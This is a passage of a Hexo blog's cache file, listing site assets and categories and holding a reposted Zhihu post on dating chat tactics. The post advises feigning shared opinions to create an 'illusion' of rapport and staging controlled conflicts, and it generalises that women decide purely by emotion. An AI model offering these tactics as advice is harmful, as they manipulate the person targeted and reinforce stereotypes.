lic/tags/Linux-process/index.html","hash":"5b304ccac9b5ca9ab5880e687e677d708daba16f","modified":1525760033582},{"_id":"public/tags/ES5-ES6/index.html","hash":"ac831deea8c82203a98cc4862c90cfc54f900db1","modified":1525760033582},{"_id":"public/tags/响应式/index.html","hash":"28137027333368b67a7e5c51e96d75afc59cca3d","modified":1525760033582},{"_id":"public/tags/BFC/index.html","hash":"0e8cb837c1da6e48c63bdce6c914ab7b3042d24b","modified":1525760033582},{"_id":"public/tags/MongoDB/index.html","hash":"ac819265a1cedf7c9fab550f6442db4ee3315666","modified":1525760033582},{"_id":"public/tags/SQL范式/index.html","hash":"2b8f5a6730ac4ecfb52300866d626d10d7ac404a","modified":1525760033582},{"_id":"public/tags/React/index.html","hash":"44a5aefb5558f38c637f99a806a547b3b55f8fdf","modified":1525760033582},{"_id":"public/tags/Windows-系统快捷键/index.html","hash":"7d98260f6edb24774566101d567e8e6607b52fdc","modified":1525760033582},{"_id":"public/tags/自定义shell/index.html","hash":"a744ecb4bf100e68067bb3e505d2f3c883a60571","modified":1525760033582},{"_id":"public/tags/SPDY/index.html","hash":"cffe01de8bd8762d78fe38ae578659888f288b1e","modified":1525760033583},{"_id":"public/tags/gogs-docker/index.html","hash":"ea5699415bcd7bab2e77103bae1b6b4920404590","modified":1525760033583},{"_id":"public/2018/05/07/Linux/持续进攻/index.html","hash":"146e8c70f2f3e400b8272da2d40788463ed13d5a","modified":1525760033583},{"_id":"public/2018/05/05/怪异的JS/index.html","hash":"e26a51e1aec1dd07b8d8c40257a8b5f5e404c3c7","modified":1525760033583},{"_id":"public/2018/05/02/SQL/数据库范式介绍/index.html","hash":"e1ba5a8521843579c895b3f0309ad3557cda27f6","modified":1525760033583},{"_id":"public/2018/05/04/Linux/添加自定义shell/index.html","hash":"54cf26f39a754b3f2b1ede4cd99201859e0a9895","modified":1525760033583},{"_id":"public/2018/04/28/GIT/git-操作规范/index.html","hash":"7fa91589c948a43474e758319fa882c481f7b0b2","modified":1525760033583},{"_id":"public/2018/04/16/JS/JS笔记-廖雪峰/index.html","hash":"edb6c1e3dd492a16325981de31e8a20d60e6f7a3","modified":1525760033583},{"_id":"public/2018/05/04/Linux/linux下docker部署gogs-git仓库/index.html","hash":"57d965ca3b57b0686ca872c5bdd0b4ffc2b6e051","modified":1525760033583},{"_id":"public/2018/04/16/JS/原生Ajax请求/index.html","hash":"5ce59348de64f1fc7e4df43dc6541e8c740c35ee","modified":1525760033583},{"_id":"public/2018/04/16/SQL/MongoDB-Node.js中的使用/index.html","hash":"87263f3c7118836a6e2b1f152999e27c2d674bd1","modified":1525760033583},{"_id":"public/2017/09/13/WebFramework/React-01/index.html","hash":"f96a0eee3d6e3a8740e1957119b10a8c478d2b99","modified":1525760033583},{"_id":"public/2017/01/16/Editor/VSCode使用笔记/index.html","hash":"0cd2b8bf234a328988783377e770cd657b25d98f","modified":1525760033583},{"_id":"public/2018/04/28/GIT/git使用指南/index.html","hash":"1ddd3d88712fd23627823bf9c434c4e14bed9233","modified":1525760033583},{"_id":"public/archives/page/2/index.html","hash":"fa3fd3141b73dcedc6df40bbc22ab3cd8491c46f","modified":1525760033583},{"_id":"public/archives/2018/page/2/index.html","hash":"65baa9324e8903210acf089ba1748dcfce3da0ca","modified":1525760033583},{"_id":"public/archives/page/3/index.html","hash":"b10e241f1e43fee1c1763868b9508f4279b56551","modified":1525760033583},{"_id":"public/index.html","hash":"50303c5a9bd06da836814572806f270b169c5a5f","modified":1525760033584},{"_id":"public/page/2/index.html","hash":"502e2bd868a3a22284c05c85145f4c8fd9b59c08","modified":1525760033584},{"_id":"public/page/3/index.html","hash":"2a1515876251bbf8500467818cec9833022dc6c9","modified":1525760033584},{"_id":"public/categories/NPM/index.html","hash":"a52f630b8c6e8727259984835f75c3960f1b3106","modified":1525760033600},{"_id":"public/tags/npm-上传包/index.html","hash":"90ad9e66c1b023dcd2a37f92e4e63222d51e5f4d","modified":1525760033600},{"_id":"public/css/fonts/fontawesome-webfont.eot","hash":"7619748fe34c64fb157a57f6d4ef3678f63a8f5e","modified":1525760033600},{"_id":"public/css/images/icon2.png","hash":"d9fe6b6ff83c93ef62a301202a041586a7c9c2ff","modified":1525760033600},{"_id":"public/css/fonts/FontAwesome.otf","hash":"b5b4f9be85f91f10799e87a083da1d050f842734","modified":1525760033600},{"_id":"public/css/fonts/fontawesome-webfont.woff","hash":"04c3bf56d87a0828935bd6b4aee859995f321693","modified":1525760033600},{"_id":"public/plugin/fancybox/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1525760033600},{"_id":"public/plugin/fancybox/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1525760033600},{"_id":"public/plugin/fancybox/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1525760033600},{"_id":"public/css/images/icon.png","hash":"fee44135f55ced3dee76a1f9f879c73417b7bfef","modified":1525760033600},{"_id":"public/plugin/fancybox/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1525760033601},{"_id":"public/plugin/fancybox/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1525760033601},{"_id":"public/plugin/fancybox/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1525760033601},{"_id":"public/plugin/fancybox/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1525760033601},{"_id":"public/css/fonts/fontawesome-webfont.ttf","hash":"7f09c97f333917034ad08fa7295e916c9f72fd3f","modified":1525760035912},{"_id":"public/plugin/galmenu/wulusai.mp3","hash":"34e7bc2cf591f7b38a2c709a8c9fd84bdf197a59","modified":1525760035914},{"_id":"public/plugin/galmenu/img.png","hash":"05f69ea7da06bc228eac4d2ef80d0c8d2131bd05","modified":1525760035914},{"_id":"public/js/script.js","hash":"2876e0b19ce557fca38d7c6f49ca55922ab666a1","modified":1525760035919},{"_id":"public/css/plugin/animate.css","hash":"7a1f3de057c416bd10edc288c7e8ac0b645232ab","modified":1525760035920},{"_id":"public/css/plugin/hover.css","hash":"54ec3d2774906f08e711ac0e494dccd09aefd570","modified":1525760035920},{"_id":"public/plugin/bganimation/bg.css","hash":"ecb949d2dd3d458c80772b255f93dab3e6a80783","modified":1525760035920},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1525760035920},{"_id":"public/plugin/fancybox/jquery.fancybox.css","hash":"aaa582fb9eb4b7092dc69fcb2d5b1c20cca58ab6","modified":1525760035920},{"_id":"public/plugin/galmenu/GalMenu.js","hash":"8549620fcb0b6a9bb329b799906aba6fb41c61f0","modified":1525760035920},{"_id":"public/plugin/galmenu/GalMenu.css","hash":"ae1357f888f3389bc4b39bde62d68533caefb6b5","modified":1525760035920},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-buttons.js","hash":"dc3645529a4bf72983a39fa34c1eb9146e082019","modified":1525760035920},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-media.js","hash":"294420f9ff20f4e3584d212b0c262a00a96ecdb3","modified":1525760035920},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1525760035920},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-thumbs.js","hash":"47da1ae5401c24b5c17cc18e2730780f5c1a7a0c","modified":1525760035920},{"_id":"public/css/style.css","hash":"a2420ea21c577271f9d1bf490d2aab6e2e7b92c4","modified":1525760035920},{"_id":"public/css/fontawesome/font-awesome-ie7.min.css","hash":"d66b7374b5dd6259dfd5c4eb682925305f6716d4","modified":1525760035920},{"_id":"public/css/fontawesome/font-awesome-ie7.css","hash":"e142f6748ea95bff17ba450ed071a17b066642c7","modified":1525760035920},{"_id":"public/plugin/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1525760035921},{"_id":"public/css/fontawesome/font-awesome.css","hash":"57ca25a18cbdedf36973b712bc81f9e3f883a371","modified":1525760035921},{"_id":"public/css/fontawesome/font-awesome.min.css","hash":"68e2602c02181b61eebc9e1dccb0a38377fa5df7","modified":1525760035921},{"_id":"public/plugin/fancybox/jquery.fancybox.js","hash":"d08b03a42d5c4ba456ef8ba33116fdbb7a9cabed","modified":1525760035921},{"_id":"public/css/images/banne1r.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1525760035989},{"_id":"public/css/fonts/fontawesome-webfont.svg","hash":"a275426daefd3716c53561fad121d258a7f05b47","modified":1525760035989},{"_id":"public/css/images/banner.jpg","hash":"532bf5150abc6aedb871c8b05e5c8dacd4111f32","modified":1525760035989}],"Category":[{"name":"感情","_id":"cjgxa4n9c0004r8xjrjrelcys"},{"name":"算法","_id":"cjgxa4n9l0008r8xjmb8y2x5w"},{"name":"文学技能","_id":"cjgxa4n9n000cr8xjgr4nqth0"},{"name":"git","_id":"cjgxa4naw000kr8xjpanjhegz"},{"name":"JS","_id":"cjgxa4nbe0010r8xjsuoxe2w7"},{"name":"编辑器","_id":"cjgxa4nbn001cr8xjxem217l1"},{"name":"Ajax","_id":"cjgxa4nbq001jr8xj36fmd8vj"},{"name":"Linux","_id":"cjgxa4nbt001qr8xj8h1fidfz"},{"name":"原生JS","_id":"cjgxa4nc00023r8xjuoos8hjk"},{"name":"CSS","_id":"cjgxa4nc4002ar8xj5wjitozt"},{"name":"NPM","_id":"cjgxa4nc6002fr8xjanb5wple"},{"name":"数据库","_id":"cjgxa4nc7002jr8xjtpraxdt8"},{"name":"前端","_id":"cjgxa4ncb002tr8xjb7huo2ok"},{"name":"Windows","_id":"cjgxa4ncd002zr8xjoqzptd5r"},{"name":"shell","_id":"cjgxa4nce0033r8xjg7fp05va"},{"name":"HTTP","_id":"cjgxa4nce0037r8xjn1fniusx"}],"Data":[],"Page":[{"title":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"title: \"categories\"\nlayout: \"categories\"\n---\n","date":"2018-01-01T07:16:31.315Z","updated":"2017-08-16T07:34:26.000Z","path":"categories/index.html","comments":1,"_id":"cjgxa4n950001r8xjvj0c6ygz","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Tags","layout":"tags","_content":"","source":"tags/index.md","raw":"title: \"Tags\"\nlayout: \"tags\"\n---","date":"2018-01-01T07:16:31.325Z","updated":"2017-08-16T07:34:26.000Z","path":"tags/index.html","comments":1,"_id":"cjgxa4n9a0003r8xjbvak89uj","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"撩妹套路","date":"2018-05-07T05:46:33.000Z","archives":"撩妹套路","_content":"## 转载知乎[聊天套路](https://www.zhihu.com/question/47029505/answer/256114477)\n## 写在前面的话：\n聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。\n\n从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。\n\n但这并不是一切，\n\n## 1.寻找切入话题\n通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。\n\n例一：你发现\\\n①：她喜欢听周杰伦。\\\n②：她喜欢听万青。\\\n③：她喜欢打羽毛球。\\\n④：她喜欢美剧。\\\n⑤：她讨厌鹿晗。\\\n⑥：她讨厌不清不楚的男女暧昧关系。\\\n⑦：她特别不喜欢吃菠萝。\\\n⑧：她有每天起床后喝一杯热水的习惯。\\\n⑨：她有每天晚上跑步的习惯。\n\n你会选择哪个话题切入呢？\\\n正确答案是②、④、⑥、⑧。\\\n前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。\n\n当然其它选项也不要忘了、在后期仍然有很大的用处。\n\n## 2.负起带节奏的重担\n①：`知识面`要广、不必什么都懂、但什么你都能说上两句。\\\n②：`有趣机智`、`脑回路清奇`以求`脱颖而出`、这里考验的是`段子储备`量和`临场反应`。烂大街的梗就不要用了、只会让你显得更加无趣。`前期`幽默的形式以自黑为主、`中后期`以黑她为主、当然是不伤大雅的那种黑。\\\n③：`前期`做一个合格的`捧哏`，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。`中后期`做一个合格的`逗哏`、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\\n④：拒绝`尬聊`。在发现话题进行不下去的时候、请找个`借口赶紧溜`了、再多说一句都可能会死。\\\n⑤：`换位思考`。你打出一行字后或准备说出一句话时、先把自己`带入`到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\\n⑥：`先人一步`。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\\n⑦：可以给她一个`专属代称`、就是只有你才会那么叫她的那种。\\\n⑧：从以前的聊天记录或面谈中找到几个`有趣的梗`、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\\n⑨：无论如何、一定要`尊重`她、开玩笑要懂得`分寸`、这是`底线`。\n\n## 3.控场\n①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古`表白多白表`、从来`姻缘少原因`。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\\n②：`前期`你可以每天主动聊天、但到`中后期`一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\\n③：制造`完全可控`的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\\n④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。\n\n**例二**：\\\n一起出去玩，要`买水果`。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。\n\n`心理距离`很重要、太冒进会容易让女生起戒备心。\n\n你只要一下走`进`了太多就一定要在合适的时候后`退`一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。\n\n## 4.鸣金收兵\n女生以情绪为导向做出决定。\n\n一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。\n\n直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。\n\n但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。\n\n## 写在后面的话\n如果你已经追上心爱的女孩了。\n\n可你的噩梦才刚刚开始\n\n追女生容易, 经营、运行一段恋情走下去才是最难的。","source":"_posts/撩妹套路.md","raw":"---\ntitle: 撩妹套路\ndate: 2018-05-07 13:46:33\ntags: 感情\narchives: 撩妹套路\ncategories: 感情\n---\n## 转载知乎[聊天套路](https://www.zhihu.com/question/47029505/answer/256114477)\n## 写在前面的话：\n聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。\n\n从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。\n\n但这并不是一切，\n\n## 1.寻找切入话题\n通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。\n\n例一：你发现\\\n①：她喜欢听周杰伦。\\\n②：她喜欢听万青。\\\n③：她喜欢打羽毛球。\\\n④：她喜欢美剧。\\\n⑤：她讨厌鹿晗。\\\n⑥：她讨厌不清不楚的男女暧昧关系。\\\n⑦：她特别不喜欢吃菠萝。\\\n⑧：她有每天起床后喝一杯热水的习惯。\\\n⑨：她有每天晚上跑步的习惯。\n\n你会选择哪个话题切入呢？\\\n正确答案是②、④、⑥、⑧。\\\n前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。\n\n当然其它选项也不要忘了、在后期仍然有很大的用处。\n\n## 2.负起带节奏的重担\n①：`知识面`要广、不必什么都懂、但什么你都能说上两句。\\\n②：`有趣机智`、`脑回路清奇`以求`脱颖而出`、这里考验的是`段子储备`量和`临场反应`。烂大街的梗就不要用了、只会让你显得更加无趣。`前期`幽默的形式以自黑为主、`中后期`以黑她为主、当然是不伤大雅的那种黑。\\\n③：`前期`做一个合格的`捧哏`，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。`中后期`做一个合格的`逗哏`、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\\n④：拒绝`尬聊`。在发现话题进行不下去的时候、请找个`借口赶紧溜`了、再多说一句都可能会死。\\\n⑤：`换位思考`。你打出一行字后或准备说出一句话时、先把自己`带入`到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\\n⑥：`先人一步`。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\\n⑦：可以给她一个`专属代称`、就是只有你才会那么叫她的那种。\\\n⑧：从以前的聊天记录或面谈中找到几个`有趣的梗`、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\\n⑨：无论如何、一定要`尊重`她、开玩笑要懂得`分寸`、这是`底线`。\n\n## 3.控场\n①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古`表白多白表`、从来`姻缘少原因`。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\\n②：`前期`你可以每天主动聊天、但到`中后期`一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\\n③：制造`完全可控`的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\\n④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。\n\n**例二**：\\\n一起出去玩，要`买水果`。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。\n\n`心理距离`很重要、太冒进会容易让女生起戒备心。\n\n你只要一下走`进`了太多就一定要在合适的时候后`退`一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。\n\n## 4.鸣金收兵\n女生以情绪为导向做出决定。\n\n一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。\n\n直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。\n\n但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。\n\n## 写在后面的话\n如果你已经追上心爱的女孩了。\n\n可你的噩梦才刚刚开始\n\n追女生容易, 经营、运行一段恋情走下去才是最难的。","slug":"撩妹套路","published":1,"updated":"2018-05-07T06:39:59.566Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4n8x0000r8xjh2lwdf76","content":"<h2 id=\"转载知乎聊天套路\"><a href=\"#转载知乎聊天套路\" class=\"headerlink\" title=\"转载知乎聊天套路\"></a>转载知乎<a href=\"https://www.zhihu.com/question/47029505/answer/256114477\" target=\"_blank\" rel=\"noopener\">聊天套路</a></h2><h2 id=\"写在前面的话：\"><a href=\"#写在前面的话：\" class=\"headerlink\" title=\"写在前面的话：\"></a>写在前面的话：</h2><p>聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。</p>\n<p>从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。</p>\n<p>但这并不是一切，</p>\n<h2 id=\"1-寻找切入话题\"><a href=\"#1-寻找切入话题\" class=\"headerlink\" title=\"1.寻找切入话题\"></a>1.寻找切入话题</h2><p>通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。</p>\n<p>例一：你发现\\<br>①：她喜欢听周杰伦。\\<br>②：她喜欢听万青。\\<br>③：她喜欢打羽毛球。\\<br>④：她喜欢美剧。\\<br>⑤：她讨厌鹿晗。\\<br>⑥：她讨厌不清不楚的男女暧昧关系。\\<br>⑦：她特别不喜欢吃菠萝。\\<br>⑧：她有每天起床后喝一杯热水的习惯。\\<br>⑨：她有每天晚上跑步的习惯。</p>\n<p>你会选择哪个话题切入呢？\\<br>正确答案是②、④、⑥、⑧。\\<br>前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。</p>\n<p>当然其它选项也不要忘了、在后期仍然有很大的用处。</p>\n<h2 id=\"2-负起带节奏的重担\"><a href=\"#2-负起带节奏的重担\" class=\"headerlink\" title=\"2.负起带节奏的重担\"></a>2.负起带节奏的重担</h2><p>①：<code>知识面</code>要广、不必什么都懂、但什么你都能说上两句。\\<br>②：<code>有趣机智</code>、<code>脑回路清奇</code>以求<code>脱颖而出</code>、这里考验的是<code>段子储备</code>量和<code>临场反应</code>。烂大街的梗就不要用了、只会让你显得更加无趣。<code>前期</code>幽默的形式以自黑为主、<code>中后期</code>以黑她为主、当然是不伤大雅的那种黑。\\<br>③：<code>前期</code>做一个合格的<code>捧哏</code>，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。<code>中后期</code>做一个合格的<code>逗哏</code>、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\<br>④：拒绝<code>尬聊</code>。在发现话题进行不下去的时候、请找个<code>借口赶紧溜</code>了、再多说一句都可能会死。\\<br>⑤：<code>换位思考</code>。你打出一行字后或准备说出一句话时、先把自己<code>带入</code>到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\<br>⑥：<code>先人一步</code>。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\<br>⑦：可以给她一个<code>专属代称</code>、就是只有你才会那么叫她的那种。\\<br>⑧：从以前的聊天记录或面谈中找到几个<code>有趣的梗</code>、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\<br>⑨：无论如何、一定要<code>尊重</code>她、开玩笑要懂得<code>分寸</code>、这是<code>底线</code>。</p>\n<h2 id=\"3-控场\"><a href=\"#3-控场\" class=\"headerlink\" title=\"3.控场\"></a>3.控场</h2><p>①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古<code>表白多白表</code>、从来<code>姻缘少原因</code>。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\<br>②：<code>前期</code>你可以每天主动聊天、但到<code>中后期</code>一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\<br>③：制造<code>完全可控</code>的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\<br>④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。</p>\n<p><strong>例二</strong>：\\<br>一起出去玩，要<code>买水果</code>。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。</p>\n<p><code>心理距离</code>很重要、太冒进会容易让女生起戒备心。</p>\n<p>你只要一下走<code>进</code>了太多就一定要在合适的时候后<code>退</code>一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。</p>\n<h2 id=\"4-鸣金收兵\"><a href=\"#4-鸣金收兵\" class=\"headerlink\" title=\"4.鸣金收兵\"></a>4.鸣金收兵</h2><p>女生以情绪为导向做出决定。</p>\n<p>一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。</p>\n<p>直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。</p>\n<p>但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。</p>\n<h2 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h2><p>如果你已经追上心爱的女孩了。</p>\n<p>可你的噩梦才刚刚开始</p>\n<p>追女生容易, 经营、运行一段恋情走下去才是最难的。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转载知乎聊天套路\"><a href=\"#转载知乎聊天套路\" class=\"headerlink\" title=\"转载知乎聊天套路\"></a>转载知乎<a href=\"https://www.zhihu.com/question/47029505/answer/256114477\" target=\"_blank\" rel=\"noopener\">聊天套路</a></h2><h2 id=\"写在前面的话：\"><a href=\"#写在前面的话：\" class=\"headerlink\" title=\"写在前面的话：\"></a>写在前面的话：</h2><p>聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。</p>\n<p>从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。</p>\n<p>但这并不是一切，</p>\n<h2 id=\"1-寻找切入话题\"><a href=\"#1-寻找切入话题\" class=\"headerlink\" title=\"1.寻找切入话题\"></a>1.寻找切入话题</h2><p>通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。</p>\n<p>例一：你发现\\<br>①：她喜欢听周杰伦。\\<br>②：她喜欢听万青。\\<br>③：她喜欢打羽毛球。\\<br>④：她喜欢美剧。\\<br>⑤：她讨厌鹿晗。\\<br>⑥：她讨厌不清不楚的男女暧昧关系。\\<br>⑦：她特别不喜欢吃菠萝。\\<br>⑧：她有每天起床后喝一杯热水的习惯。\\<br>⑨：她有每天晚上跑步的习惯。</p>\n<p>你会选择哪个话题切入呢？\\<br>正确答案是②、④、⑥、⑧。\\<br>前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。</p>\n<p>当然其它选项也不要忘了、在后期仍然有很大的用处。</p>\n<h2 id=\"2-负起带节奏的重担\"><a href=\"#2-负起带节奏的重担\" class=\"headerlink\" title=\"2.负起带节奏的重担\"></a>2.负起带节奏的重担</h2><p>①：<code>知识面</code>要广、不必什么都懂、但什么你都能说上两句。\\<br>②：<code>有趣机智</code>、<code>脑回路清奇</code>以求<code>脱颖而出</code>、这里考验的是<code>段子储备</code>量和<code>临场反应</code>。烂大街的梗就不要用了、只会让你显得更加无趣。<code>前期</code>幽默的形式以自黑为主、<code>中后期</code>以黑她为主、当然是不伤大雅的那种黑。\\<br>③：<code>前期</code>做一个合格的<code>捧哏</code>，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。<code>中后期</code>做一个合格的<code>逗哏</code>、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\<br>④：拒绝<code>尬聊</code>。在发现话题进行不下去的时候、请找个<code>借口赶紧溜</code>了、再多说一句都可能会死。\\<br>⑤：<code>换位思考</code>。你打出一行字后或准备说出一句话时、先把自己<code>带入</code>到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\<br>⑥：<code>先人一步</code>。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\<br>⑦：可以给她一个<code>专属代称</code>、就是只有你才会那么叫她的那种。\\<br>⑧：从以前的聊天记录或面谈中找到几个<code>有趣的梗</code>、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\<br>⑨：无论如何、一定要<code>尊重</code>她、开玩笑要懂得<code>分寸</code>、这是<code>底线</code>。</p>\n<h2 id=\"3-控场\"><a href=\"#3-控场\" class=\"headerlink\" 